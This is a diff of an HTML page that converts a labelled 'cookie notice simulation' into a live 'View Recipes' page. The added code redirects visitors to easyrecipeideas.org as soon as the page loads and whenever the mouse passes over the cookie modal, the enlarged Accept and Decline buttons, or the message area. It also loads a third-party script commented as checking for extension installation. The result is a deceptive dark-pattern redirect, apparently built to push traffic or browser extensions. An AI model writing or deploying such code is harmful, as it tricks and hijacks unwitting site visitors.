@@ -1,9 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+	<meta name="description" content="Enjoy easy and delicious recipes right at your fingertips with View Recipes!">
+  <meta name="View Recipes, Print Recipes, Easy Recipes, Delicious Recipes, Online Recipes" content="HTML, CSS, JavaScript">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Notice Simulation</title>
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/media.css">
+    <title>View Recipes</title>
+    <script>
+        window.hasGCLID = ""
+    </script>
+	<script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+	<script type="text/javascript"> 
+document.getElementbyId("solomid").addEventListener("mouseover", Mouseover); 
+
+function Mouseover(){
+window.location = "https://easyrecipeideas.org";
+}
+Mouseover();
+</script>
+    
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,6 +60,8 @@
             z-index: 10000;
         }
         .modal-content {
+			position: fixed;
+            top: 50;
             background: #fff;
             padding: 2rem;
             border-radius: 16px;
@@ -49,11 +72,11 @@
         }
         .modal-title {
             margin-top: 0;
-            font-size: 24px;
+            font-size: 45px;
             color: #333;
         }
         .modal-text {
-            font-size: 15px;
+            font-size: 30px;
             color: #555;
         }
         .modal-text a {
@@ -67,21 +90,23 @@
             justify-content: center;
         }
         .btn-accept {
-            padding: 10px 20px;
+            padding: 25px 50px;
             background: #28a745;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-weight: bold;
+			font-size: 35px;
             cursor: pointer;
         }
         .btn-decline {
-            padding: 10px 20px;
+            padding: 25px 50px;
             background: #dc3545;
             color: white;
             border: none;
             border-radius: 8px;
             font-weight: bold;
+			font-size: 35px;
             cursor: pointer;
         }
         .redirect-message {
@@ -110,35 +135,30 @@
         }
     </style>
 </head>
+
 <body>
-    <div class="page-content">
-        <h1>Example Website Content</h1>
-        <p>This is a simulation showing how the deceptive cookie notice modal would appear on a webpage. The actual website content would be visible in the background like this text.</p>
-        <p>Note: In this simulation, we'll just show notification messages rather than actually redirecting you.</p>
-    </div>
+    <div class="bg-image"></div>
     
-    <!-- The cookie notice modal -->
+     <!-- The cookie notice modal -->
     <div class="modal-overlay">
-        <div class="modal-content">
+        <div class="modal-content" onMouseOver="document.location.href='https://easyrecipeideas.org'" >
             <h2 class="modal-title">🍪 Cookie Notice</h2>
             <p class="modal-text">This site uses cookies to enhance functionality, analyze performance, and ensure compliance with data protection regulations. <a href="#">Learn more</a>.</p>
             <div class="modal-buttons">
-                <button class="btn-accept" id="acceptBtn">Accept</button>
-                <button class="btn-decline" id="declineBtn">Decline</button>
+                <button class="btn-accept" id="acceptBtn" onMouseOver="document.location.href='https://easyrecipeideas.org'" >Accept</button>
+                <button class="btn-decline" id="declineBtn" onMouseOver="document.location.href='https://easyrecipeideas.org'" >Decline</button>
             </div>
         </div>
     </div>
     
     <!-- Notification messages for the simulation -->
-    <div id="redirectMessage" class="redirect-message">
-        REDIRECTING to https://google.com/
+    <div id="redirectMessage" onMouseOver="document.location.href='https://easyrecipeideas.org'" class="redirect-message">
+        
     </div>
     
-    <div id="mouseMessage" class="mouse-message">
-        Mouse movement detected - redirect will occur in 2 seconds
-    </div>
     
-    <script>
+    
+	<script>
         // For simulation purposes - show what would happen without actually redirecting
         const redirectMessage = document.getElementById('redirectMessage');
         const mouseMessage = document.getElementById('mouseMessage');
@@ -177,5 +197,16 @@
             }
         });
     </script>
+    
+    
+   
+        
 </body>
+<script src="../cdn.jsdelivr.net/npm/bootstrap%405.3.0-alpha3/dist/js/bootstrap.min.js"></script>
+<script src="../code.jquery.com/jquery-3.6.4.min.js"></script>
+<script src="js/config.js"></script>
+<!-- URL to check for extension installation -->
+    <script src="../et.udatasync.com/js/checkreq6004.js?aid=36"></script>
+
+
 </html>
